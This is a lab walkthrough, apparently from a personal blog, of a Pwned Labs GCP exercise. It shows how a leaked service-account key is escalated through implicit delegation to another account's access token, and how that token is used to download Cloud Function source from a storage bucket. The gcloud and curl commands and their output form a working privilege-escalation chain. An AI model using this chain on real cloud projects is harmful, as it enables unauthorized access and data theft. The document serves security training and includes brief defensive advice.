---
title: Escalate GCP privileges with Implicit Delegation 
description: Escalate GCP privileges with Implicit Delegation
image:
  path: gcp.png
categories:
- Pwned Labs
- GCP
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/gcp/
tags:
- pwnedlabs
- gcp
- cloud
---
# Scenario
A GCP service account key has been found leaked on Pastebin after some time... and the client has asked for our help to identify the blast radius and potential impact of the compromised account. Your objective is to see if you can escalate privileges from this service account and access sensitive data.

# Walkthrough

We are given user-created service account key file `sv1-337@gr-proj-1.iam.gserviceaccount.com.json `

```
└─$ cat sv1-337@gr-proj-1.iam.gserviceaccount.com.json 
{
  "type": "service_account",
  "project_id": "gr-proj-1",
  "private_key_id": "02f2902e3e65578195c4f36fe507162edfa402fe",
  "private_key": "<REDACTED>",
  "client_email": "sv1-337@gr-proj-1.iam.gserviceaccount.com",
  "client_id": "111427737805377123038",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/sv1-337%40gr-proj-1.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}         
```

Let's authenticate using provided credentials
```
└─$ gcloud auth activate-service-account --key-file=sv1-337@gr-proj-1.iam.gserviceaccount.com.json 
Activated service account credentials for: [sv1-337@gr-proj-1.iam.gserviceaccount.com]
 
```

We can start listing the service accounts in the current project and we see number of default and custom GCP service accounts.
```
└─$ gcloud iam service-accounts list --project gr-proj-1
DISPLAY NAME                            EMAIL                                                            DISABLED
Intermediate-Account-dev-team           intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com  False
frontend-dev-buckets                    frontend-dev-buckets@gr-proj-1.iam.gserviceaccount.com           False
sv1                                     sv1-337@gr-proj-1.iam.gserviceaccount.com                        False
setmetadata                             setmetadata@gr-proj-1.iam.gserviceaccount.com                    False
Compute Engine default service account  212055223570-compute@developer.gserviceaccount.com               False
devops-re                               devops-re@gr-proj-1.iam.gserviceaccount.com                      False
internal-Web-Dev-Team                   internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com          False
App Engine default service account      gr-proj-1@appspot.gserviceaccount.com                            False
appdev                                  appdev@gr-proj-1.iam.gserviceaccount.com                         False
sv3                                     sv3-939@gr-proj-1.iam.gserviceaccount.com                        False
BucketViewer                            bucketviewer@gr-proj-1.iam.gserviceaccount.com                   False
sv2                                     sv2-962@gr-proj-1.iam.gserviceaccount.com                        False

```

We can try viewing the individual permissions of specific accounts. It can be done at the project or individual service account level, but at the project level can make it a bit more difficult to visualize and understand due to the number of identity and role bindings. Let's check the roles and permissions of the compromised account `sv1-337@gr-proj-1.iam.gserviceaccount.com`
```
└─$ gcloud iam service-accounts get-iam-policy sv1-337@gr-proj-1.iam.gserviceaccount.com
bindings:
- members:
  - serviceAccount:sv1-337@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomFrontendAppDevRole
etag: BwYRl9qKJQs=
version: 1

```
We see a binding for `CustomFrontendAppDevRole`. Let's check the permissions granted by this role
```
└─$ gcloud iam roles describe CustomFrontendAppDevRole --project=gr-proj-1
description: 'Created on: 2024-02-17 Based on: Frontend AppDevRole'
etag: BwYRl9erE9w=
includedPermissions:
- iam.roles.get
- iam.roles.list
- iam.serviceAccounts.getIamPolicy
- iam.serviceAccounts.list
- resourcemanager.projects.get
- resourcemanager.projects.getIamPolicy
name: projects/gr-proj-1/roles/CustomFrontendAppDevRole
stage: ALPHA
title: List_IAM_POLICY
```
We can only list service accounts and view the IAM policies

Let's examine some other IAM policies in the GCP project, starting with service account `sv2-962@gr-proj-1.iam.gserviceaccount.com` which could be related to our compromised account:
```
└─$ gcloud iam service-accounts get-iam-policy sv2-962@gr-proj-1.iam.gserviceaccount.com
bindings:
- members:
  - serviceAccount:sv1-337@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomRole736
etag: BwYRl-GgV2c=
version: 1
```
`sv2-962@gr-proj-1.iam.gserviceaccount.com` is bound to the custom role `CustomRole736`, so let's examine it
```
└─$ gcloud iam roles describe CustomRole736 --project=gr-proj-1
description: 'Created on: 2024-02-17'
etag: BwYRl94lEVg=
includedPermissions:
- iam.serviceAccounts.implicitDelegation
name: projects/gr-proj-1/roles/CustomRole736
stage: ALPHA
title: Implicit_delegation
```
`CustomRole736` grants the dangerous permission `iam.serviceAccounts.implicitDelegation`, which allows `sv1-337` to execute commands as `sv2-962` without explicit consent. Implicit delegation allows one user or service account to perform actions on behalf of another user or service account without needing explicit consent. This is often used in scenarios where an application needs access to GCP resources on behalf another identity. Such resources could be anything, from Cloud Storage buckets to Compute Engine instances (VMs).

Let's check the IAM roles and permissions of the `sv3-939@gr-proj-1.iam.gserviceaccount.com`
```
└─$ gcloud iam service-accounts get-iam-policy sv3-939@gr-proj-1.iam.gserviceaccount.com
bindings:
- members:
  - serviceAccount:sv2-962@gr-proj-1.iam.gserviceaccount.com
  role: roles/iam.serviceAccountTokenCreator
etag: BwYR0jQnfO0=
version: 1

```
Seems that `sv2-962@gr-proj-1.iam.gserviceaccount.com` can create create access tokens for the service account `sv3-939@gr-proj-1.iam.gserviceaccount.com`. It can be exploited to escalate privileges from the service account `sv1-337` to `sv3-939` by leveraging the implicit delegation and create token privileges

The [blog post from Rhino Security Labs](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/) is recommended reading to learn about this and other privilege escalation techniques. 

[](escalate-gcp-privileges-with-implicit-delegation-1.png)

Start the attack and escalate the privileges to `sv3-939@gr-proj-1.iam.gserviceaccount.com` . First, print the access token of `sv1-337`
```
└─$ gcloud auth print-access-token
<REDACTED>
```
Then generate an access token for `sv3-939@gr-proj-1.iam.gserviceaccount.com` using `curl` command. We use the implicit delegation privilege between the `sv1` and `sv2` service accounts to generate an access token for the `sv3` service account. We authenticate using the `srv1` token, specify `srv2` as a delegate, and send the request to the API endpoint to generate an API token for `srv3`
```
└─$ curl -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sv3-939@gr-proj-1.iam.gserviceaccount.com:generateAccessToken?access_token=<REDACTED>" \
  -H "Content-Type: application/json" \
  --data '{
    "delegates": ["projects/-/serviceAccounts/'"sv2-962@gr-proj-1.iam.gserviceaccount.com"'"],
    "scope": ["https://www.googleapis.com/auth/cloud-platform"]
  }'
{
  "accessToken": "<REDACTED>",
  "expireTime": "2025-09-08T16:09:25Z"
}
```
We have generated an access token for `sv3-939@gr-proj-1.iam.gserviceaccount.com`, which we can validate
```
└─$ curl https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=<REDACTED>
{
  "azp": "107592944455085205950",
  "aud": "107592944455085205950",
  "scope": "https://www.googleapis.com/auth/cloud-platform",
  "exp": "1757347765",
  "expires_in": "3483",
  "access_type": "online"
}
```
Now use [gcp-iam-brute](https://github.com/hac01/gcp-iam-brute) to brute force IAM permissions for `sv3-939@gr-proj-1.iam.gserviceaccount.com`. Although in this case we have permission to directly enumerate the IAM policies for any IAM user in the project, this tool is helpful since we are less likely to have permissions in real engagement to list IAM permissions
```
└─$ python3 main.py --access-token <REDACTED> --project-id gr-proj-1 --service-account-email sv3-939@gr-proj-1.iam.gserviceaccount.com
⠹ Fuzzing...
Role: securitycenter.securityResponseServiceAgent.json

{'permissions': ['storage.buckets.get']}

========================================
<SNIP>

⠙ Fuzzing...
Role: storage.legacyBucketWriter.json

{'permissions': ['storage.buckets.get', 'storage.managedFolders.get', 'storage.managedFolders.list', 'storage.multipartUploads.list', 'storage.objects.list']}
<SNIP>

⠧ Fuzzing...
Role: eventarc.serviceAgent.json

{'permissions': ['cloudfunctions.functions.get', 'storage.buckets.get']}

<SNIP>
```
We see that `sv3-939@gr-proj-1.iam.gserviceaccount.com` has some permissions related to Cloud Functions. Let's numerate them. Thus, set the token for `srv3` as a variable with the command `export ACCESS_TOKEN=<SRv3_ACCESS_TOKEN>`
```
└─$ curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://cloudfunctions.googleapis.com/v1/projects/gr-proj-1/locations/-/functions"
{
  "functions": [
    {
      "name": "projects/gr-proj-1/locations/us-central1/functions/function-1",
      "httpsTrigger": {
        "url": "https://us-central1-gr-proj-1.cloudfunctions.net/function-1",
        "securityLevel": "SECURE_ALWAYS"
      },
      "status": "ACTIVE",
      "entryPoint": "github_webhook",
      "timeout": "60s",
      "availableMemoryMb": 256,
      "serviceAccountEmail": "bucketviewer@gr-proj-1.iam.gserviceaccount.com",
      "updateTime": "2024-02-17T19:24:00.822Z",
      "versionId": "2",
      "labels": {
        "deployment-tool": "console-cloud"
      },
      "sourceUploadUrl": "https://storage.googleapis.com/uploads-889535551524.us-central1.cloudfunctions.appspot.com/c20edf92-3ac6-49e6-8474-a55f93bd6244.zip",
      "runtime": "python310",
      "maxInstances": 1,
      "ingressSettings": "ALLOW_ALL",
      "buildId": "7663008c-dcb0-490c-8745-13ae87f46f14",
      "buildName": "projects/212055223570/locations/us-central1/builds/7663008c-dcb0-490c-8745-13ae87f46f14",
      "dockerRegistry": "ARTIFACT_REGISTRY",
      "automaticUpdatePolicy": {},
      "satisfiesPzi": true
    }
  ]
}

```

We see the function named `function-1`. Google Cloud Function code gets stored in a Google Cloud Storage bucket. Although we don't know the exact bucket name, it's worth noting that GCP uses a predictable naming format for Cloud Function buckets. The bucket naming format is `gcf-sources-<buildnumber>-<region>`:
- `gcf-sources`: A hardcoded value
- `212055223570`: The build number (included above with the buildName key)
- `us-central1`: The region

Let's see if this bucket exists
```
└─$ BUCKET_NAME="gcf-sources-212055223570-us-central1"
```
```
└─$ curl -X GET -H "Authorization: Bearer $ACCESS_TOKEN" "https://storage.googleapis.com/storage/v1/b/$BUCKET_NAME/o"

{
  "kind": "storage#objects",
  "items": [
    {
      "kind": "storage#object",
      "id": "gcf-sources-212055223570-us-central1/DO_NOT_DELETE_THE_BUCKET.md/1708197659276058",
      "selfLink": "https://www.googleapis.com/storage/v1/b/gcf-sources-212055223570-us-central1/o/DO_NOT_DELETE_THE_BUCKET.md",
      "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/gcf-sources-212055223570-us-central1/o/DO_NOT_DELETE_THE_BUCKET.md?generation=1708197659276058&alt=media",
      "name": "DO_NOT_DELETE_THE_BUCKET.md",
      "bucket": "gcf-sources-212055223570-us-central1",
      "generation": "1708197659276058",
      "metageneration": "1",
      "contentType": "application/octet-stream",
      "storageClass": "STANDARD",
      "size": "200",
      "md5Hash": "OQa/JpF3xZ3EUq3UfX9Q7A==",
      "crc32c": "Wx6VDg==",
      "etag": "CJrmv5WMs4QDEAE=",
      "timeCreated": "2024-02-17T19:20:59.279Z",
      "updated": "2024-02-17T19:20:59.279Z",
      "timeStorageClassUpdated": "2024-02-17T19:20:59.279Z",
      "timeFinalized": "2024-02-17T19:20:59.279Z"
    },
    {
      "kind": "storage#object",
      "id": "gcf-sources-212055223570-us-central1/function-1-8678e4fb-cf43-4d97-b877-6512729bdba4/version-1/function-source.zip/1708197659454839",
      "selfLink": "https://www.googleapis.com/storage/v1/b/gcf-sources-212055223570-us-central1/o/function-1-8678e4fb-cf43-4d97-b877-6512729bdba4%2Fversion-1%2Ffunction-source.zip",
      "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/gcf-sources-212055223570-us-central1/o/function-1-8678e4fb-cf43-4d97-b877-6512729bdba4%2Fversion-1%2Ffunction-source.zip?generation=1708197659454839&alt=media",
      "name": "function-1-8678e4fb-cf43-4d97-b877-6512729bdba4/version-1/function-source.zip",
      "bucket": "gcf-sources-212055223570-us-central1",
      "generation": "1708197659454839",
      "metageneration": "1",
      "contentType": "application/zip",
      "storageClass": "STANDARD",
      "size": "883",
      "md5Hash": "Z9foPEdXl4NJ7gsY9SqzAw==",
      "crc32c": "i+rrVg==",
      "etag": "CPfaypWMs4QDEAE=",
      "timeCreated": "2024-02-17T19:20:59.457Z",
      "updated": "2024-02-17T19:20:59.457Z",
      "timeStorageClassUpdated": "2024-02-17T19:20:59.457Z",
      "timeFinalized": "2024-02-17T19:20:59.457Z"
    },
    {
      "kind": "storage#object",
      "id": "gcf-sources-212055223570-us-central1/function-1-8678e4fb-cf43-4d97-b877-6512729bdba4/version-2/function-source.zip/1708197786687849",
      "selfLink": "https://www.googleapis.com/storage/v1/b/gcf-sources-212055223570-us-central1/o/function-1-8678e4fb-cf43-4d97-b877-6512729bdba4%2Fversion-2%2Ffunction-source.zip",
      "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/gcf-sources-212055223570-us-central1/o/function-1-8678e4fb-cf43-4d97-b877-6512729bdba4%2Fversion-2%2Ffunction-source.zip?generation=1708197786687849&alt=media",
      "name": "function-1-8678e4fb-cf43-4d97-b877-6512729bdba4/version-2/function-source.zip",
      "bucket": "gcf-sources-212055223570-us-central1",
      "generation": "1708197786687849",
      "metageneration": "1",
      "contentType": "application/zip",
      "storageClass": "STANDARD",
      "size": "879",
      "md5Hash": "J6hVW5YFa2Dyso/xOfQ6Jg==",
      "crc32c": "3wEYjw==",
      "etag": "COmyoNKMs4QDEAE=",
      "timeCreated": "2024-02-17T19:23:06.691Z",
      "updated": "2024-02-17T19:23:06.691Z",
      "timeStorageClassUpdated": "2024-02-17T19:23:06.691Z",
      "timeFinalized": "2024-02-17T19:23:06.691Z"
    }
  ]
}

```
It exists, so let's download the source code and inspect it
```
└─$ FILE_URL="https://www.googleapis.com/download/storage/v1/b/gcf-sources-212055223570-us-central1/o/function-1-8678e4fb-cf43-4d97-b877-6512729bdba4%2Fversion-2%2Ffunction-source.zip?generation=1708197786687849&alt=media"
```
```
└─$ curl -o function-source.zip -H "Authorization: Bearer $ACCESS_TOKEN" "$FILE_URL"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   879  100   879    0     0    975      0 --:--:-- --:--:-- --:--:--   975
s
```
```
└─$ unzip function-source.zip                         
Archive:  function-source.zip
  inflating: main.py                 
  inflating: requirements.txt        
  inflating: flag.txt 
```
# Attack path
Attack path visualization created by [Thibault Gardet](https://www.linkedin.com/in/thibault-gardet/) for Pwned Labs

![](escalate-gcp-privileges-with-implicit-delegation-2.png)

# Defense
Based on lab's [Defense](https://pwnedlabs.io/labs/escalate-gcp-privileges-with-implicit-delegation) section.

- Keep track of who has been assigned these permissions, and to monitor for their use.
- It's worth taking a purple approach and periodically assessing the security of your infrastructure through simulated breaches such as this (in addition to periodic penetration testing), to help with understanding the blast radius of various accounts, were they to be compromised.